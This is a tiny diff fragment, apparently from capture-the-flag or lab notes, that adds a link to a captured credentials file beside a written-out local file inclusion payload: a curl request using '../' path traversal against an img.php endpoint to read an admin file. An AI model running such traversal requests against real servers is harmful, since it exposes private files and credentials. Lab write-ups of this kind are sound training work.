@@ -23,4 +23,4 @@ Payload: `curl http://dev.holo.live/img.php?file=../../../../var/www/admin/super
 
 Exploit: [[exploit](exploit/LFI/exploit.sh)]
 
-Loot:
+Loot: [creds](exploit/LFI/creds.txt)
